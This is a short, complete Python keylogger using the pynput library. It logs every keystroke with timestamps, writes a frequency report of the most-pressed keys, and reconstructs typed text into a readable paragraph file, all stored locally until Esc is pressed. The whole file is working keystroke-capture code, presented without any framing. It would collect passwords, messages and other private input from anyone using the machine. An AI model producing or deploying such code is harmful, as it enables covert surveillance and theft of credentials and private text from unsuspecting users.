import threading
from pynput import keyboard
from datetime import datetime
from collections import Counter

log_file = "keylog.txt"
freq_file = "keyfreq.txt"
paragraph_file = "keyparagraph.txt"

buffer = []
buffer_lock = threading.Lock()
flush_interval = 5  # seconds

key_counter = Counter()
counter_lock = threading.Lock()

for f in (log_file, freq_file, paragraph_file):
    with open(f, "w", encoding="utf-8") as file:
        pass

def flush_buffer():
    global buffer
    with buffer_lock:
        if buffer:
            with open(log_file, "a", encoding="utf-8") as f:
                f.write(''.join(buffer))
            buffer = []
    threading.Timer(flush_interval, flush_buffer).start()

def save_frequency():
    with counter_lock:
        if key_counter:
            most_common = key_counter.most_common(10)
            with open(freq_file, "w", encoding="utf-8") as f:
                f.write(f"Key Frequency Report - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                for key, count in most_common:
                    f.write(f"{key}: {count}\n")
    threading.Timer(flush_interval, save_frequency).start()

def append_paragraph(char):
    if char.startswith('[') and char.endswith(']'):
        special = char[1:-1]
        if special in ('space', 'tab'):
            char = ' '
        elif special in ('enter', 'return'):
            char = '\n'
        else:
            char = ' '
    with open(paragraph_file, "a", encoding="utf-8") as f:
        f.write(char)

def on_press(key):
    try:
        char = key.char
    except AttributeError:
        char = f'[{key.name}]'

    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    entry = f'{timestamp} {char}\n'

    with buffer_lock:
        buffer.append(entry)

    with counter_lock:
        key_counter[char] += 1

    append_paragraph(char)

def on_release(key):
    if key == keyboard.Key.esc:
        flush_buffer()
        save_frequency()
        return False

flush_buffer()
save_frequency()

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()